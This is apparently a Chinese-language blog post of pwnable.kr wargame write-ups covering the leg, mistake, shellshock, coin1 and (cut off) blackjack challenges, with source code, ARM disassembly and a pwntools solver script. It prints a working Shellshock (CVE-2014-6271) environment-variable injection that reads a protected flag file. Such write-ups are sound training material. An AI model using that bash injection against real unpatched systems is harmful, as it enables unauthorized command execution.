key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">        write(<span class="number">0</span>, buf, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;: push    &#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;: add r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;: sub sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:    mov r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:    str r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:    ldr r0, [pc, #104]  ; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:    bl  0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:    sub r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:    ldr r0, [pc, #96]   ; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:    mov r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:    bl  0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:    bl  0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:    mov r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:    bl  0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:    mov r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:    add r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:    bl  0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:    mov r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:    add r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:    ldr r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:    cmp r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:    bne 0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:    ldr r0, [pc, #44]   ; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:    bl  0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:    ldr r0, [pc, #40]   ; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:   bl  0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:   b   0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:   ldr r0, [pc, #32]   ; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:   bl  0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:   mov r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:   mov r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:   sub sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:   pop &#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:   andeq   r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:   andeq   r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:           ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:           ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:   andeq   r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;: mov r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;: push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx  r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;: mov r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>上面的代码让我有些懵逼, 加上 ssh 连上题目服务器后一大堆调试信息铺面而来,<br>不过退出的时候看见了 qemu-system-arm 字样, 冷静分析过后我总算是明白了: 这次的平台是arm</p><p>用不了 F5 了....</p><h2 id="ARM汇编简介"><a href="#ARM汇编简介" class="headerlink" title="ARM汇编简介"></a>ARM汇编简介</h2><p>先来学习一下arm汇编</p><ul><li>pc 保存着即将执行的指令的地址</li><li>r3 保存函数返回值(写起来像是这样的)</li><li>r0 保存函数返回值(反汇编的结果好像是这样的)</li><li>#  是常量标识符</li><li>lr 保存着调用者调用完自己后应该执行的下一条指令的地址(调用者的pc)</li></ul><h2 id="key1"><a href="#key1" class="headerlink" title="key1"></a>key1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00008cd4 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cd8 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">0x00008cdc &lt;+8&gt;: mov r3, pc</span><br><span class="line">0x00008ce0 &lt;+12&gt;:    mov r0, r3</span><br><span class="line">0x00008ce4 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">0x00008ce8 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">0x00008cec &lt;+24&gt;:    bx  lr</span><br></pre></td></tr></table></figure><p>r3 的值就是 pc 的值, pc的值在执行 <code>mov r3, pc</code> 时为 0x8cdc + 0x8.<br>(arm流水作业特性, 没看懂...)</p><p>总之最终返回 0x8ce4</p><h2 id="key2"><a href="#key2" class="headerlink" title="key2"></a>key2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00008cf0 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008cf4 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">0x00008cf8 &lt;+8&gt;: push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">0x00008cfc &lt;+12&gt;:    add r6, pc, #1</span><br><span class="line">0x00008d00 &lt;+16&gt;:    bx  r6</span><br><span class="line">0x00008d04 &lt;+20&gt;:    mov r3, pc</span><br><span class="line">0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:    pop &#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:    pop &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:    mov r0, r3</span><br><span class="line">0x00008d14 &lt;+36&gt;:    sub sp, r11, #0</span><br><span class="line">0x00008d18 &lt;+40&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d1c &lt;+44&gt;:    bx  lr</span><br></pre></td></tr></table></figure><p>首先 <code>add r6, pc, #1</code> , r6的值为 <code>0x8cfc + 8 + 1=0x8d05</code></p><p><code>bx r6</code> 跳转到r6表示的地址, 并且根据最低位(1/0)判断进入(thumb/arm)模式, 这个地方显然是进入 thumb 状态</p><p>下面两行使 r3=0x8d04+0x4+4 , 由于thumb模式下一条指令两个字节, 所以这次pc只+0x4</p><p>然后就这么执行下去, 最终返回 0x08d0c</p><h2 id="key3"><a href="#key3" class="headerlink" title="key3"></a>key3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00008d20 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">0x00008d24 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">0x00008d28 &lt;+8&gt;: mov r3, lr</span><br><span class="line">0x00008d2c &lt;+12&gt;:    mov r0, r3</span><br><span class="line">0x00008d30 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">0x00008d34 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">0x00008d38 &lt;+24&gt;:    bx  lr</span><br></pre></td></tr></table></figure><p><code>mov r3, lr</code> r3的值为lr的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:    bl  0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:    mov r3, r0</span><br></pre></td></tr></table></figure><p>看下 main 函数的反汇编, 可以发现下一条指令的地址为 0x8d80</p><p>那么返回值就是 0x8d80 了</p><p>最终结果 0x8ce4+0x8d0c+0x8d80=108400</p><p>输入得到flag <code>My daddy has a lot of ARMv5te muscle!</code></p><h1 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h1><blockquote><p>We all make mistakes, let&#39;s move on.<br>(don&#39;t take this too seriously, no fancy hacking skill is required at all)</p><p>This task is based on real event<br>Thanks to dhmonkey</p><p>hint : operator priority</p><p>ssh <a href="mailto:mistake@pwnable.kr" target="_blank" rel="noopener">mistake@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>提示我们这个地方不需要任何 fancy 的 hacking skill, 并且基于真实事件</p><p>还提示了我们这个是和符号优先级有关的错误</p><p>mistake.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        s[i] ^= XORKEY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">    sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// xor your input</span></span><br><span class="line">    xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目要求我们输入一个10位密码, 每位与1异或以后再判断是否和./password文件中的密码相等(这个文件我们没有权限读取)</p><p>并且为了防止爆破加上了延时</p><p>题目已经提醒了是符号优先级, 我们把代码读一遍就可以发现<br><code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code><br>这行代码是存在问题的</p><p><code>=</code>的优先级小于<code>&lt;</code>, 所以这段代码相当于将 <code>open(&quot;...&quot;) &lt; 0</code> 的值赋给了fd, fd的值只有0和1两种可能</p><p>既然我们能够正常执行, 那这个地方就是1了, 为1的话看起来是从 stdout 中读取数据, 不过在控制台中似乎效果和 stdin 是一样的</p><p>那么这个地方就相当于我们可以控制密码的值, 随便找个数挨位异或一下</p><p>如 0325476981 和 1234567890, 然后执行./mistake,<br>等光标不闪的时候先后输入这两个数</p><p>flag: <code>Mommy, the operator priority always confuses me :(</code></p><h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><blockquote><p>Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)</p><p>ssh <a href="mailto:shellshock@pwnable.kr" target="_blank" rel="noopener">shellshock@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>和 bash 有关? 沙盒逃逸之类的么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -l</span><br><span class="line">total 960</span><br><span class="line">-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setresuid(getegid(), getegid(), getegid());</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一脸懵逼地看着代码</p><p>查了一下,getegid, setresuid, setresgid, 还是不明白它在干什么, 我该怎么下手?</p><p>后来看到题目简介, 说是 a shocking news about bash</p><p>莫非是漏洞?</p><p>于是用 &quot;bash uid 漏洞&quot; 为关键词搜索, 果然搜索到了: <a href="https://bbs.aliyun.com/read/177039.html?page=e" target="_blank" rel="noopener">bash漏洞最新补丁可被绕过</a></p><p>在shell中执行代码 <code>env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock</code></p><p>flag: <code>only if I knew CVE-2014-6271 ten years ago..!!</code></p><p>我十年前就知道CVE-2014-6271就好了!!</p><h1 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h1><blockquote><p>Mommy, I wanna play a game!<br>(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</p><p>Running at : nc pwnable.kr 9007</p></blockquote><p>不详的预感</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">-              Shall we play a game?              -</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">You have given some gold coins in your hand</span><br><span class="line">however, there is one counterfeit coin among them</span><br><span class="line">counterfeit coin looks exactly same as real coin</span><br><span class="line">however, its weight is different from real one</span><br><span class="line">real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">help me to find the counterfeit coin with a scale</span><br><span class="line">if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">FYI, you have 30 seconds.</span><br><span class="line"></span><br><span class="line">- How to play -</span><br><span class="line">1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">3. you get the weight information</span><br><span class="line">4. 2~3 repeats C time, then you give the answer</span><br><span class="line"></span><br><span class="line">- Example -</span><br><span class="line">[Server] N=4 C=2    # find counterfeit among 4 coins with 2 trial</span><br><span class="line">[Client] 0 1        # weigh first and second coin</span><br><span class="line">[Server] 20         # scale result : 20</span><br><span class="line">[Client] 3          # weigh fourth coin</span><br><span class="line">[Server] 10         # scale result : 10</span><br><span class="line">[Client] 2          # counterfeit coin is third!</span><br><span class="line">[Server] Correct!</span><br><span class="line"></span><br><span class="line">- Ready? starting in 3 sec... -</span><br></pre></td></tr></table></figure><p>N个硬币中有1个假币, 要你称出来</p><p>简单的二分, 直接上脚本</p><p>需要注意的是在自己电脑上跑延迟太高30s内跑到100根本不可能, 随便放到哪道题的服务器上跑比较好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'0'</span>, <span class="number">9007</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'- Ready? starting in 3 sec... -'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    N, C = re.findall(<span class="string">r'\d+'</span>, io.recvline_startswith(<span class="string">'N='</span>).decode())</span><br><span class="line">    print(<span class="string">'&#123;&#125;.N=&#123;&#125; C=&#123;&#125;'</span>.format(n, N, C))</span><br><span class="line">    N = [str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(int(N))]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(int(C)):</span><br><span class="line">        length = len(N)</span><br><span class="line">        left  = N[<span class="number">0</span>:length//<span class="number">2</span>]</span><br><span class="line">        right = N[length//<span class="number">2</span>:length]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(N) != <span class="number">1</span>:</span><br><span class="line">            io.sendline(<span class="string">' '</span>.join(left))</span><br><span class="line">            weight = int(io.recv())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> weight != <span class="number">10</span> * len(left):</span><br><span class="line">                N = left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                N = right</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'ANS:&#123;&#125;'</span>.format(N[<span class="number">0</span>]))</span><br><span class="line">    io.sendline(N[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>b1NaRy_S34rch1nG_1s_3asy_p3asy</code></p><p>这是最像flag的一个flag了</p><h1 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h1><blockquote><p>Hey! check out this C implementation of blackjack game!<br>I found it online</p><ul><li><a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></li></ul><p>I like to give my flags to millionares.<br>how much money you got?</p><p>Running at : nc pwnable.kr 9009</p></blockquote><p>代码将近800行</p><p>原先以为要写个C程序一直赢赢到百万富翁</p><p>后来觉得太扯了</p><p>仔细看代码是有漏洞的, 下注的地方原本不能下比自己当前现金还多的注,<br>但这个地方让用户第二次输入时没有进行校验, 导致了第二次可以输入任意金额</p><p>输入一个特大的注, 多玩几次就能得到flag了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 